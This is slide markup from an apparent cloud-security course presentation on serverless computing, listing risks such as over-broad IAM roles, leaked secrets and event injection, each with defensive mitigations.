              </a:rPr>
              <a:t>Pod/container hardening: : read-only root, drop Linux caps, no root user, seccomp/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>AppArmor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>SELinux</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" err="1">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16971531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A9416-348C-E8D8-7457-E2A2C13E8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866D0-3DF4-F790-12FD-1B9F9C6DD9EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Serverless</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7744AA3-C309-E751-C6BE-7F068FDC7C4E}"/>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ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Functions or workflows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>run on a managed platform (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>FaaS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>. You pay per invocation. Data and identity often live in cloud-native services (BaaS).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>You focus on code and events; the platform handles servers and auto-scaling.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27590278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6423C-E073-9153-5314-6AFF16505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D842E-889F-C6D3-0513-2D352F0EB96A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Serverless Security Concerns 01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4FCAF9A6-E5BB-F79A-30EB-B4983BFDF325}"/>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Over-privileged functions (IAM too broad)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> If a function is compromised, wide IAM rights let attackers touch many services (storage, DBs, queues, KMS).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Least-privilege roles per function; separate service accounts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Restrict with resource-level policies and condition keys (scoped to buckets/tables)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Permission boundaries / org policies to prevent privilege creep</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" err="1">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Separate KMS keys per data domain; limit decrypt permission</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10292629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E9CBA-C1DF-C4B6-293D-31546EED8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1EF34-743B-FDE8-936B-5A6B86DBB36E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Serverless Security Concerns 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED9766FA-8F94-A013-3779-0BEA139535B8}"/>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a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Secret sprawl in env/config</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> Credentials in env vars, config files, layers, or build artifacts leak via logs, crashes, or console access.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Use a secrets manager/KMS; fetch on invoke; short-lived tokens</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Avoid plaintext env vars; encrypt-at-rest and decrypt in memory</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Scrub logs/crash dumps; zeroize after use; rotate automatically</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" err="1">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14287620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BA437-F964-AAAE-3A26-4C511B158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7FDEA-EC7C-EC4B-B38D-993B806F1099}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Serverless Security Concerns 03</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EB226C4B-2989-6361-F3AC-53115C2879F7}"/>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Untrusted triggers &amp; event injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> Functions fire from HTTP, webhooks, queues, object stores, schedulers. Crafted events can bypass auth, exploit input bugs, or cause confused-deputy access. Replays can duplicate actions.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Verify sources (HMAC/webhook signatures, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>); audience-scoped tokens</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Strict schema validation on payloads; reject unknown fields</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Idempotency keys; anti-replay (timestamps, nonces)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" err="1">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Gate internet-facing routes behind API gateway/WAF</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25397217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DC636-9EAE-B2F1-8533-17CB1988D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8FADF-CE90-32F4-F654-7D4014965BF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Serverless Security Concerns 04</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF1EB9B0-1F27-25E3-E992-50720FFDCB27}"/>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Managed service (BaaS) misconfiguration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> Public buckets/DBs, weak row/collection rules, or permissive resource policies expose data directly, bypassing your code.</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Default-deny access rules; enforce per-user/row/field policies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Block public access on storage; private endpoints/VPC where possible</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Encrypt data with customer-managed keys; limit who can use the keys</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" err="1">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Continuous config audits and policy tests (unit tests for rules)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20486493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6D2DE-762D-06A3-209A-3507AF185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6C0D4-4EC4-ED0B-8957-C82697C9DD7B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Serverless Security Concerns 05</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DBEE281C-4669-1B32-FD32-386386F8E0C8}"/>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Event storms &amp; cost DoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> Spikes, recursive triggers, or at-least-once retries can explode concurrency, amplify downstream calls, and rack up costs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mitigations:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Concurrency limits, throttles, and quotas per function/route</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Timeouts, circuit breakers, and back-pressure; isolate heavy work via queues</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Bounded retries with DLQs; alerts on error and spend budgets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" err="1">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Cache/batch carefully to avoid amplification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36901140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68D3-B052-1290-E1BE-38591302C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CB034-8283-0049-12F2-01502813002D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Serverless Security Concerns 06</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1BA7F8D2-6054-B203-F777-DE8E7131C973}"/>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a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Supply chain &amp; multi-tenant runtime risks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> Each function ships its own deps/image; poisoned packages or CI leaks lead to RCE. Shared nodes/runtimes add isolation and side-channel concerns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mitigations:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Signed artifacts (images/zips), SBOMs, pin &amp; scan dependencies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Minimal bases; no dev tools in runtime</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Runtime hardening: read-only FS, drop Linux caps, no root; seccomp/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>AppArmor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> where supported</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>For sensitive workloads, consider stronger isolation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
